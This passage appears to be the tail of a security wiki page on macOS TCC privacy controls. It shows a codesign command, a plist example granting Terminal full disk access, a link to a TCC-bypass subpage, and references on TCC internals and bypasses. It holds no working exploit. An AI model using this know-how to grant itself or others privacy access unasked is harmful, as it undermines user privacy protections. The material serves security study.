codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Uma análise aprofundada do macOS TCC.db - Blog da Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script para rastrear com.apple.macl (Gist de brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Rastreie e enfrente com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Como contornar as proteções de privacidade do usuário do macOS TCC por acidente e intencionalmente](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Alterar o diretório home e contornar o TCC, também conhecido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection no TCC: e por que (provavelmente) não foi um risco de segurança (desta vez)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Localização e aquisição do TCC.db no macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Configurar o App Sandbox do macOS](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Entitlement de câmera](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Configurações de payload do Privacy Preferences Policy Control para gerenciamento de dispositivos Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Anatomia de uma intrusão no macOS, da isca ao comprometimento](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
